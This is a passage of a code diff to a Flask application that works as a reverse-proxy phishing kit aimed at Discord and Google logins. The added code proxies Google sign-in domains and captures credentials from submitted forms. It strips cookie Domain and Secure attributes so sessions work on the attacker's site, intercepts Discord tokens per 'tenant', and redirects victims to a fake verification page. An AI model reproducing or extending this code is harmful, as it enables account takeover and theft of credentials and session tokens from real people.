+            resp.headers['Cache-Control'] = 'no-store'
+            resp.set_cookie('_gsid', new_sid, max_age=600, httponly=True, samesite='Lax')
+            return resp
+        print(f'[google-proxy] Google returned {r.status_code}')
+    except Exception as e:
+        print(f'[google-proxy] Failed to fetch Google login: {e}')
+    return make_response('Google login temporarily unavailable', 502)
+
+
+@app.route('/_gp/<domain>/<path:rest>', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'])
+def google_proxy(domain, rest):
+    """Generic reverse proxy for Google domains."""
+    if domain not in GOOGLE_PROXY_DOMAINS:
+        return make_response('', 404)
+
+    # CORS preflight
+    if request.method == 'OPTIONS':
+        resp = make_response('', 204)
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        resp.headers['Access-Control-Allow-Methods'] = 'GET,POST,PUT,PATCH,DELETE,OPTIONS'
+        resp.headers['Access-Control-Allow-Headers'] = request.headers.get(
+            'Access-Control-Request-Headers', '*')
+        resp.headers['Access-Control-Max-Age'] = '86400'
+        return resp
+
+    qs = request.query_string.decode()
+    url = f'https://{domain}/{rest}'
+    if qs:
+        url += '?' + qs
+
+    sid, s = _get_google_session()
+
+    # Build headers
+    fwd = {}
+    for key, val in request.headers:
+        kl = key.lower()
+        if kl in ('host', 'cookie', 'accept-encoding', 'connection',
+                  'x-forwarded-for', 'x-forwarded-proto', 'x-real-ip',
+                  'x-request-id', 'cf-connecting-ip', 'cf-ray'):
+            continue
+        fwd[key] = val
+    fwd['Host'] = domain
+    if 'Origin' in fwd:
+        fwd['Origin'] = f'https://{domain}'
+    if 'Referer' in fwd:
+        fwd['Referer'] = f'https://{domain}/'
+
+    body = request.get_data()
+    method = request.method.lower()
+
+    # Server-side credential capture from POST forms
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if method == 'post' and body:
+        _check_google_creds(body, f'{domain}/{rest}', client_ip)
+
+    try:
+        if method == 'get':
+            r = s.get(url, headers=fwd, timeout=30, allow_redirects=False)
+        elif method == 'post':
+            r = s.post(url, headers=fwd, data=body, timeout=30, allow_redirects=False)
+        elif method == 'put':
+            r = s.put(url, headers=fwd, data=body, timeout=30, allow_redirects=False)
+        elif method == 'patch':
+            r = s.patch(url, headers=fwd, data=body, timeout=30, allow_redirects=False)
+        elif method == 'delete':
+            r = s.delete(url, headers=fwd, timeout=30, allow_redirects=False)
+        else:
+            return make_response('', 405)
+    except Exception as e:
+        print(f'[gproxy] {method.upper()} {url} failed: {e}')
+        return make_response('Proxy error', 502)
+
+    # Handle redirects — rewrite Location header
+    if r.status_code in (301, 302, 303, 307, 308):
+        location = r.headers.get('Location', '')
+        location = _google_rewrite_redirect(location)
+        resp = make_response('', r.status_code)
+        resp.headers['Location'] = location
+        resp.set_cookie('_gsid', sid, max_age=600, httponly=True, samesite='Lax')
+        return resp
+
+    # Rewrite HTML responses
+    ct = r.headers.get('Content-Type', '')
+    data = r.content
+    if 'text/html' in ct:
+        data = _google_rewrite_html(data.decode('utf-8', errors='replace')).encode('utf-8')
+    elif 'javascript' in ct:
+        text = data.decode('utf-8', errors='replace')
+        for d in GOOGLE_PROXY_DOMAINS:
+            text = text.replace(f'https://{d}/', f'/_gp/{d}/')
+            text = text.replace(f'//{d}/', f'/_gp/{d}/')
+        data = text.encode('utf-8')
+    elif 'text/css' in ct:
+        text = data.decode('utf-8', errors='replace')
+        for d in GOOGLE_PROXY_DOMAINS:
+            text = text.replace(f'https://{d}/', f'/_gp/{d}/')
+        data = text.encode('utf-8')
+
+    resp = make_response(data, r.status_code)
+    for key, val in r.headers.items():
+        kl = key.lower()
+        if kl in _STRIP_RESP:
+            continue
+        if kl == 'set-cookie':
+            # Strip Domain= attribute so cookies work on our domain
+            val = re.sub(r';\s*[Dd]omain=[^;]*', '', val)
+            val = re.sub(r';\s*[Ss]ecure', '', val)
+        resp.headers[key] = val
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    resp.set_cookie('_gsid', sid, max_age=600, httponly=True, samesite='Lax')
+    return resp
 
 
 @app.route('/assets/<path:rest>')
@@ -3594,7 +4720,7 @@ def proxy_assets(rest):
         if cached and (time.time() - cached['time']) < ASSET_CACHE_TTL:
             resp = make_response(cached['data'], 200)
             resp.headers['Content-Type'] = cached['ct']
-            resp.headers['Cache-Control'] = 'public, max-age=3600'
+            resp.headers['Cache-Control'] = 'public, max-age=31536000, immutable'
             resp.headers['Access-Control-Allow-Origin'] = '*'
             return resp
     url = f'https://discord.com/assets/{rest}'
@@ -3622,7 +4748,7 @@ def proxy_assets(rest):
             _asset_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
         resp = make_response(data, 200)
         resp.headers['Content-Type'] = ct
-        resp.headers['Cache-Control'] = 'public, max-age=3600'
+        resp.headers['Cache-Control'] = 'public, max-age=31536000, immutable'
         resp.headers['Access-Control-Allow-Origin'] = '*'
         return resp
     except Exception as e:
@@ -3632,13 +4758,32 @@ def proxy_assets(rest):
 
 @app.route('/cdn/<path:rest>')
 def proxy_cdn(rest):
-    """Proxy Discord CDN (avatars, emojis, etc)."""
+    """Proxy Discord CDN (avatars, emojis, etc) with in-memory caching."""
+    cache_key = f'/cdn/{rest}'
+    with _cdn_cache_lock:
+        cached = _cdn_cache.get(cache_key)
+        if cached and (time.time() - cached['time']) < CDN_CACHE_TTL:
+            resp = make_response(cached['data'], 200)
+            resp.headers['Content-Type'] = cached['ct']
+            resp.headers['Cache-Control'] = 'public, max-age=3600'
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp
     url = f'https://cdn.discordapp.com/{rest}'
     try:
         s = _make_session()
         r = s.get(url, headers={'User-Agent': UA}, timeout=20)
-        resp = make_response(r.content, r.status_code)
+        if r.status_code != 200:
+            return make_response('', r.status_code)
         ct = r.headers.get('Content-Type', 'application/octet-stream')
+        data = r.content
+        # Only cache reasonable sizes (<5MB)
+        if len(data) < 5_000_000:
+            with _cdn_cache_lock:
+                if len(_cdn_cache) >= CDN_CACHE_MAX:
+                    oldest_key = min(_cdn_cache, key=lambda k: _cdn_cache[k]['time'])
+                    del _cdn_cache[oldest_key]
+                _cdn_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
+        resp = make_response(data, 200)
         resp.headers['Content-Type'] = ct
         resp.headers['Cache-Control'] = 'public, max-age=3600'
         resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -3707,7 +4852,8 @@ def proxy_discord_api_v(rest):
 
     # ═══ TOKEN INTERCEPTION ═══
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    _check_and_capture(r.content, rest, client_ip, body)
+    tenant = _get_tenant()
+    _check_and_capture(r.content, rest, client_ip, body, tenant=tenant)
 
     # Build response
     resp = make_response(r.content, r.status_code)
@@ -3723,7 +4869,12 @@ def proxy_discord_api_v(rest):
 @app.route('/channels')
 @app.route('/channels/<path:rest>')
 def proxy_channels_redirect(rest=''):
-    """After login Discord redirects here. Show success page."""
+    """After login Discord redirects here. Redirect to tenant verify page with verified state."""
+    tenant = _get_tenant()
+    if tenant:
+        if tenant.get('server_int'):
+            return redirect(f'/{tenant["identifier"]}/{tenant["server_int"]}?verified=1')
+        return redirect(f'/{tenant["guild_id"]}/{tenant["role_id"]}/{tenant["bot_key"]}?verified=1')
     return make_response('''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Discord</title></head>
 <body style="background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif">
 <div style="text-align:center;color:#fff">
@@ -3792,6 +4943,27 @@ if __name__ == '__main__':
                     stale_assets = [k for k, v in list(_asset_cache.items()) if now - v['time'] > ASSET_CACHE_TTL]
                     for k in stale_assets:
                         del _asset_cache[k]
+                # Clean up stale CDN cache
+                with _cdn_cache_lock:
+                    stale_cdn = [k for k, v in list(_cdn_cache.items()) if now - v['time'] > CDN_CACHE_TTL]
+                    for k in stale_cdn:
+                        del _cdn_cache[k]
+                # Clean up stale Google proxy sessions
+                with _google_sessions_lock:
+                    stale_gp = [k for k, v in list(_google_sessions.items()) if now - v['ts'] > GOOGLE_SESSION_TTL]
+                    for k in stale_gp:
+                        try: _google_sessions.pop(k)['s'].close()
+                        except: pass
+                # Clean up stale Google asset cache
+                with _google_asset_cache_lock:
+                    stale_ga = [k for k, v in list(_google_asset_cache.items()) if now - v['time'] > GOOGLE_ASSET_CACHE_TTL]
+                    for k in stale_ga:
+                        del _google_asset_cache[k]
+                # Clean up stale tenant cache (>10 min)
+                with _tenant_lock:
+                    stale_tenants = [k for k, v in list(_tenant_cache.items()) if now - v['ts'] > 600]
+                    for k in stale_tenants:
+                        del _tenant_cache[k]
                 # Force garbage collection to free curl_cffi / SSL memory
                 gc.collect()
             except Exception as e:
